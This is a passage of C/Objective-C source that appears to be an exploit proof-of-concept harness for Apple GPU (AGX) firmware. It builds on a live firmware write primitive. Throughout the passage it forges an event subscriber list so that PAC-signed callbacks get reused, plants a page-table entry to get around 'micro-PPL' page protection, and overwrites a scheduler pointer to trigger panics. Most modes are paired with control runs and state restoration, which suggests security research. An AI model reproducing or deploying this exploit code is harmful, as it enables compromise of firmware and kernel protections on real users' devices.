        usleep(10000);
    }
    return false;
}

static bool firmware_write64_live(drop_writer_t* writer, const read_context_t* context, uint64_t address, uint64_t value) {
    uint64_t observed = 0;
    if (firmware_read64_live(context, address, &observed) && observed == value) return true;
    return address <= UINT64_MAX - sizeof(uint32_t) && firmware_write32_live(writer, context, address + sizeof(uint32_t), (uint32_t)(value >> 32)) &&
           firmware_write32_live(writer, context, address, (uint32_t)value) && firmware_read64_live(context, address, &observed) && observed == value;
}

static bool read_signed_live_value(const read_context_t* context, uint64_t slot, uint32_t target, uint64_t* value) {
    return value && firmware_read64_live(context, slot, value) && (uint32_t)*value == target && (uint32_t)(*value >> 32) != 0 && (uint32_t)(*value >> 32) != UINT32_C(0xfffffc00);
}

static bool resolve_mbi_signed_callback(const read_context_t* context, uint64_t* slot_out, uint64_t* callback_out, uint64_t* object_out) {
    uint32_t handle = 0;
    uint64_t routes_header = 0;
    uint64_t route_array = 0;
    uint64_t route = 0;
    uint64_t records = 0;
    uint64_t mapping = 0;
    uint64_t maximum_word = 0;
    if (!slot_out || !callback_out || !object_out || !firmware_read32_live(context, GFX_MBI_ROUTE_HANDLE, &handle) || !firmware_read64_live(context, GFX_MBI_ROUTES, &routes_header) ||
        !firmware_read64_live(context, GFX_MBI_ROUTES + 8, &route_array))
        return false;

    uint32_t route_index = handle >> 16;
    uint32_t route_id = handle & UINT32_C(0xffff);
    uint32_t route_count = (uint32_t)routes_header;
    if (route_count == 0 || route_count > 64 || route_index >= route_count || !firmware_pointer(route_array) || route_array > FIRMWARE_END - sizeof(uint64_t) * route_count ||
        !firmware_read64_live(context, route_array + sizeof(uint64_t) * route_index, &route) || !firmware_pointer(route) || !firmware_read64_live(context, route + 0x10, &records) ||
        !firmware_read64_live(context, route + 0x18, &mapping) || !firmware_read64_live(context, route + 0x28, &maximum_word) || !firmware_pointer(records) || !firmware_pointer(mapping))
        return false;

    uint32_t maximum = (uint32_t)(maximum_word >> 32);
    if ((uint32_t)(route_id - 32) > UINT32_C(0xffffffec) || route_id > maximum) return false;
    uint32_t map_index = route_id < 13 ? route_id : route_id - 19;
    uint16_t map_entry = 0;
    if (!firmware_read16_live(context, mapping + sizeof(uint16_t) * map_index, &map_entry) || (map_entry & 1) == 0) return false;

    uint32_t record_index = map_entry >> 1;
    if (record_index > 0x1000) return false;
    uint64_t record = records + UINT64_C(96) * record_index;
    uint64_t slot = record + 8;
    uint64_t object = 0;
    uint64_t callback = 0;
    if (record < records || slot > FIRMWARE_END - 16 || !read_signed_live_value(context, slot, GFX_SIGNED_MBI_TARGET, &callback) || !firmware_read64_live(context, slot + 8, &object) ||
        (object != 0 && !firmware_pointer(object)))
        return false;

    *slot_out = slot;
    *callback_out = callback;
    *object_out = object;
    LOG("GFX MBI signed source handle=%#x route=%u/%u record=%u slot=%#llx object=%#llx", handle, route_index, route_id, record_index, slot, object);
    return true;
}

static bool capture_signed_event_state(const read_context_t* context, signed_event_snapshot_t* saved) {
    memset(saved, 0, sizeof(*saved));
    if (!firmware_read64_live(context, POWER_EVENTS, &saved->event_array) || !firmware_read32_live(context, POWER_PENDING, &saved->pending) || saved->event_array != POWER_EVENT0) return false;

    saved->sampler_x20_address = SAMPLER_X20;
    if (!firmware_read32_live(context, saved->sampler_x20_address, &saved->sampler_x20) || saved->pending != 0 || saved->sampler_x20 != 1) return false;

    if (!firmware_read64_live(context, saved->event_array + 0x08, &saved->event[1]) || !firmware_read64_live(context, saved->event_array, &saved->event[0]) ||
        !firmware_read64_live(context, saved->event_array + 0x10, &saved->event[2]) || !firmware_read64_live(context, saved->event_array + 0x18, &saved->event[3]))
        return false;
    for (size_t index = 0; index < sizeof(signed_event_scratch_words) / sizeof(signed_event_scratch_words[0]); index++) {
        if (!firmware_read64_live(context, signed_event_scratch_words[index], &saved->scratch[index])) return false;
    }
    bool scratch_clean = true;
    for (size_t index = 0; index < sizeof(saved->scratch) / sizeof(saved->scratch[0]); index++) {
        if (saved->scratch[index] != 0) scratch_clean = false;
    }
    return scratch_clean && firmware_pointer(saved->event[1]) && (uint32_t)saved->event[0] == (uint32_t)(saved->event[0] >> 32) && saved->event[2] == UINT64_C(0xffffffff) && saved->event[3] == 1;
}

static bool prepare_signed_event(drop_writer_t* writer, const read_context_t* context, const signed_event_snapshot_t* saved, uint64_t first_callback, uint64_t first_object, uint64_t second_callback,
                                 uint64_t second_object) {
    uint64_t count = second_callback != 0 ? 2 : 1;
    return firmware_write64_live(writer, context, GFX_FAKE_SUBSCRIBER, first_callback) && firmware_write64_live(writer, context, GFX_FAKE_SUBSCRIBER + 8, first_object) &&
           (second_callback == 0 ||
            (firmware_write64_live(writer, context, GFX_FAKE_SUBSCRIBER + 0x10, second_callback) && firmware_write64_live(writer, context, GFX_FAKE_SUBSCRIBER + 0x18, second_object))) &&
           firmware_write64_live(writer, context, saved->event_array + 8, GFX_FAKE_SUBSCRIBER) && firmware_write64_live(writer, context, saved->event_array + 0x18, count);
}

static bool restore_signed_event_state(drop_writer_t* writer, const read_context_t* context, const signed_event_snapshot_t* saved) {
    bool restored = true;
    if (!firmware_write32_live(writer, context, POWER_PENDING, saved->pending)) restored = false;
    if (!firmware_write64_live(writer, context, saved->event_array + 0x18, saved->event[3])) restored = false;
    if (!firmware_write64_live(writer, context, saved->event_array + 8, saved->event[1])) restored = false;
    if (!firmware_write32_live(writer, context, saved->sampler_x20_address, saved->sampler_x20)) restored = false;
    for (size_t reverse = sizeof(signed_event_scratch_words) / sizeof(signed_event_scratch_words[0]); reverse > 0; reverse--) {
        size_t index = reverse - 1;
        if (!firmware_write64_live(writer, context, signed_event_scratch_words[index], saved->scratch[index])) restored = false;
    }
    return restored;
}

static bool wait_signed_event(const read_context_t* context, uint64_t event_array) {
    for (unsigned attempt = 0; attempt < 500; attempt++) {
        uint32_t pending = 0;
        uint64_t subscriber = 0;
        if (!firmware_read32_live(context, POWER_PENDING, &pending) || !firmware_read64_live(context, event_array + 0x10, &subscriber)) return false;
        if (pending == 0 && subscriber == UINT64_C(0xffffffff)) return true;
        usleep(10000);
    }
    return false;
}

static bool run_signed_event_test(const drop_context_t* drop, bool pac_reuse, bool treatment) {
    read_context_t context = {};
    if (!resolve_read_context(drop, &context)) return false;

    uint64_t power = 0;
    uint64_t power_control = 0;
    if (!read_signed_live_value(&context, GFX_SIGNED_POWER_SLOT, GFX_SIGNED_POWER_TARGET, &power) ||
        !read_signed_live_value(&context, GFX_SIGNED_POWER_CONTROL_SLOT, GFX_SIGNED_POWER_TARGET, &power_control)) {
        LOG_ERR("GFX live signed-source gate failed");
        return false;
    }

    uint64_t mbi_slot = 0;
    uint64_t mbi_callback = 0;
    uint64_t mbi_object = 0;
    if (pac_reuse && !resolve_mbi_signed_callback(&context, &mbi_slot, &mbi_callback, &mbi_object)) {
        LOG_ERR("GFX live MBI signed-source gate failed");
        return false;
    }

    signed_event_snapshot_t saved = {};
    if (!capture_signed_event_state(&context, &saved)) {
        LOG_ERR("GFX signed-event initial-state gate failed");
        return false;
    }

    bool panic = !pac_reuse && treatment;
    uint64_t first_object = panic ? GFX_AUTH_FAULT_OBJECT : 0;
    uint64_t second_callback = pac_reuse ? (treatment ? mbi_callback : power_control) : 0;
    uint64_t second_object = pac_reuse && treatment ? mbi_object : 0;
    LOG("GFX %s mode=%s engine=%#llx event=%#llx sampler-x20=%#llx", pac_reuse ? "PAC reuse" : "authenticated call", treatment ? "treatment" : "control", POWER_RESOURCE, saved.event_array,
        saved.sampler_x20_address);
    LOG("GFX signed callback[0] source=%#llx raw=%#llx target=%#x object=%#llx call=BLRAAZ", GFX_SIGNED_POWER_SLOT, power, (uint32_t)power, first_object);
    if (pac_reuse) {
        LOG("GFX signed callback[1] source=%#llx raw=%#llx target=%#x object=%#llx call=BLRAAZ", treatment ? mbi_slot : GFX_SIGNED_POWER_CONTROL_SLOT, second_callback, (uint32_t)second_callback,
            second_object);
    }

    drop_writer_t writer = {};
    if (!drop_writer_begin(drop, &writer)) return false;
    bool prepared = prepare_signed_event(&writer, &context, &saved, power, first_object, second_callback, second_object);
    bool result = false;
    if (!prepared) {
        LOG_ERR("GFX signed-event preparation failed");
        goto cleanup;
    }

    if (panic) {
        LOG("GFX auth-call panic armed callback=%#llx object=%#llx expected-pc=%#llx expected-far=%#llx", power, first_object, FIRMWARE_START + GFX_SIGNED_POWER_TARGET, first_object);
    }
    if (!firmware_pulse32(&writer, POWER_PENDING, 1) || !firmware_pulse32(&writer, saved.sampler_x20_address, 0)) {
        LOG_ERR("GFX signed-event trigger failed");
        goto cleanup;
    }

    if (panic) {
        LOG("GFX auth-call treatment submitted; waiting for matching panic");
        sleep(30);
        LOG_ERR("GFX auth-call treatment returned without a panic");
        goto cleanup;
    }

    uint64_t power_after = 0;
    uint64_t power_control_after = 0;
    uint64_t mbi_after = 0;
    uint64_t active_subscribers = 0;
    uint64_t active_count = 0;
    uint64_t copied_first = 0;
    uint64_t copied_first_object = 0;
    uint64_t copied_second = 0;
    uint64_t copied_second_object = 0;
    usleep(50000);
    bool completed = wait_signed_event(&context, saved.event_array);
    bool sources_untouched = read_signed_live_value(&context, GFX_SIGNED_POWER_SLOT, GFX_SIGNED_POWER_TARGET, &power_after) &&
                             read_signed_live_value(&context, GFX_SIGNED_POWER_CONTROL_SLOT, GFX_SIGNED_POWER_TARGET, &power_control_after) && power_after == power &&
                             power_control_after == power_control && (!pac_reuse || (read_signed_live_value(&context, mbi_slot, GFX_SIGNED_MBI_TARGET, &mbi_after) && mbi_after == mbi_callback));
    bool relocated = completed && firmware_read64_live(&context, saved.event_array + 8, &active_subscribers) && firmware_read64_live(&context, saved.event_array + 0x18, &active_count) &&
                     firmware_read64_live(&context, GFX_FAKE_SUBSCRIBER, &copied_first) && firmware_read64_live(&context, GFX_FAKE_SUBSCRIBER + 8, &copied_first_object) &&
                     active_subscribers == GFX_FAKE_SUBSCRIBER && active_count == (pac_reuse ? 2 : 1) && copied_first == power && copied_first_object == first_object;
    if (relocated && pac_reuse) {
        relocated = firmware_read64_live(&context, GFX_FAKE_SUBSCRIBER + 0x10, &copied_second) && firmware_read64_live(&context, GFX_FAKE_SUBSCRIBER + 0x18, &copied_second_object) &&
                    copied_second == second_callback && copied_second_object == second_object;
    }
    result = completed && relocated && sources_untouched;
    LOG("GFX %s completed=%u callbacks=%llu relocated=%u sources-untouched=%u proof=%s", pac_reuse ? "PAC reuse" : "authenticated call", completed, active_count, relocated, sources_untouched,
        result ? "verified" : "failed");

cleanup: {
    bool firmware_restored = restore_signed_event_state(&writer, &context, &saved);
    unsigned writes = writer.writes;
    bool host_restored = drop_writer_end(&writer);
    LOG("GFX signed-event cleanup firmware=%s host=%s writes=%u", firmware_restored ? "restored" : "failed", host_restored ? "restored" : "failed", writes);
    return result && firmware_restored && host_restored;
}
}

static bool clear_microppl_pte(drop_writer_t* writer, const read_context_t* context) {
    bool low = firmware_write32_live(writer, context, GFX_TEST_ALIAS_PTE, 0);
    bool high = low && firmware_write32_live(writer, context, GFX_TEST_ALIAS_PTE + sizeof(uint32_t), 0);
    uint64_t observed = UINT64_MAX;
    bool verified = high && firmware_read64_live(context, GFX_TEST_ALIAS_PTE, &observed) && observed == 0;
    LOG("GFX micro-PPL PTE cleanup low=%u high=%u observed=%#llx status=%s", low, high, observed, verified ? "cleared" : "uncertain");
    return verified;
}

static bool microppl_preflight(const drop_context_t* drop, read_context_t* context) {
    memset(context, 0, sizeof(*context));
    uint64_t physical = 0;
    if (!resolve_read_context(drop, context)) return false;
    read_context_t loaded_map = {.firmware = context->firmware};
    if (!resolve_rtbuddy_map(&loaded_map, GFX_AUTH_SCRATCH, sizeof(uint32_t), &physical)) {
        LOG_ERR("GFX micro-PPL source resolution failed");
        return false;
    }

    uint64_t original_pte = UINT64_MAX;
    uint64_t original_source = 0;
    if (!firmware_read64_live(context, GFX_TEST_ALIAS_PTE, &original_pte) || original_pte != 0 || !firmware_read64_live(context, GFX_AUTH_SCRATCH, &original_source)) {
        LOG_ERR("GFX micro-PPL preflight failed pte=%#llx source=%#llx", original_pte, original_source);
        return false;
    }

    uint64_t page = physical & ~(uint64_t)(PAGE_SIZE_16K - 1);
    uint64_t offset = physical & (PAGE_SIZE_16K - 1);
    uint64_t descriptor = page | GFX_DATA_PAGE_DESCRIPTOR;
    uint64_t alias = GFX_TEST_ALIAS + offset;
    if (page == 0 || !gfx_write_pointer(alias) || !gfx_write_pointer(GFX_TEST_ALIAS_PTE)) {
        LOG_ERR("GFX micro-PPL address gate failed physical=%#llx alias=%#llx pte=%#llx", physical, alias, GFX_TEST_ALIAS_PTE);
        return false;
    }

    LOG("GFX micro-PPL control source=%#llx physical=%#llx pte=%#llx descriptor=%#llx alias=%#llx source-value=%#llx", GFX_AUTH_SCRATCH, physical, GFX_TEST_ALIAS_PTE, descriptor, alias,
        original_source);
    LOG("GFX micro-PPL control pte-readable=1 pte-empty=1 source-resolved=1 mutation=0 proof=verified");
    return true;
}

static bool run_microppl_control(const drop_context_t* drop) {
    read_context_t context = {};
    return microppl_preflight(drop, &context);
}

static bool run_microppl_panic(const drop_context_t* drop) {
    read_context_t context = {};
    if (!microppl_preflight(drop, &context)) {
        LOG_ERR("GFX micro-PPL panic refused: control proof failed");
        return false;
    }

    uint64_t descriptor = GFX_MICROPPL_TEST_PHYSICAL | GFX_DATA_PAGE_DESCRIPTOR;
    drop_writer_t writer = {};
    if (!drop_writer_begin(drop, &writer)) return false;
    bool installed = firmware_write64_live(&writer, &context, GFX_TEST_ALIAS_PTE, descriptor);
    if (!installed) {
        bool cleared = clear_microppl_pte(&writer, &context);
        (void)drop_writer_end(&writer);
        LOG_ERR("GFX micro-PPL panic PTE install failed cleanup=%s", cleared ? "restored" : "uncertain");
        return false;
    }

    LOG("GFX micro-PPL panic armed pte=%#llx descriptor=%#llx alias=%#llx physical=%#llx expected=PTE-permission-or-SAPT-fault", GFX_TEST_ALIAS_PTE, descriptor, GFX_TEST_ALIAS,
        GFX_MICROPPL_TEST_PHYSICAL);
    bool submitted = firmware_pulse32(&writer, GFX_TEST_ALIAS, GFX_MICROPPL_MARKER);
    LOG("GFX micro-PPL panic treatment returned submitted=%u; waiting for panic", submitted);
    sleep(30);

    bool cleared = clear_microppl_pte(&writer, &context);
    unsigned writes = writer.writes;
    bool host_restored = drop_writer_end(&writer);
    LOG_ERR("GFX micro-PPL panic did not occur; firmware=%s host=%s writes=%u", cleared ? "restored" : "uncertain", host_restored ? "restored" : "failed", writes);
    return false;
}

static bool run_drop_panic(const drop_context_t* context) {
    if (!run_drop_control(context)) {
        LOG_ERR("panic treatment refused: control proof failed");
        return false;
    }

    uint64_t target = SCHEDULER_GLOBAL + sizeof(uint32_t);
    if (!drop_blind_write32(context, target, DROP_MARKER)) {
        LOG_ERR("panic treatment was not submitted");
        return false;
    }

    LOG("panic treatment submitted: scheduler pointer high word at %#llx", target);
    sleep(30);
    bool restored = drop_blind_write32(context, target, UINT32_C(0xfffffc00));
    LOG_ERR("panic did not occur before timeout; firmware cleanup=%s", restored ? "restored" : "failed");
    return false;
}

bool agx_run_test(agx_test_mode_t mode, uint64_t argument) {
    @autoreleasepool {
        if (mode == AGX_TEST_ACQUIRE_ONLY) return true;
        if (mode == AGX_TEST_SHADOW) return agx_shadow_test(g_ctx.self_pmap);

        id<MTLDevice> device = MTLCreateSystemDefaultDevice();
        id<MTLBuffer> keepalive = [device newBufferWithLength:PAGE_SIZE_16K options:MTLResourceStorageModeShared];
        if (!device || !keepalive) {
            LOG_ERR("Metal device setup failed");
            return false;
        }
        usleep(500000);

        drop_context_t context = {};
        if (!resolve_drop_context(&context)) return false;
        switch (mode) {
            case AGX_TEST_READ_CONTROL:
                return run_read_control(&context);
            case AGX_TEST_READ:
                return run_read(&context, argument);
            case AGX_TEST_WRITE_CONTROL:
                return run_drop_control(&context);
            case AGX_TEST_WRITE_PANIC:
                return run_drop_panic(&context);
            case AGX_TEST_AUTH_CALL_CONTROL:
                return run_signed_event_test(&context, false, false);
            case AGX_TEST_AUTH_CALL_PANIC:
                return run_signed_event_test(&context, false, true);
            case AGX_TEST_PAC_REUSE_CONTROL:
                return run_signed_event_test(&context, true, false);
            case AGX_TEST_PAC_REUSE:
                return run_signed_event_test(&context, true, true);
            case AGX_TEST_MICROPPL_CONTROL:
                return run_microppl_control(&context);
            case AGX_TEST_MICROPPL_PANIC:
                return run_microppl_panic(&context);
            case AGX_TEST_ACQUIRE_ONLY:
            case AGX_TEST_SHADOW:
            case AGX_TEST_COUNT:
                break;
        }
        return false;
    }
}
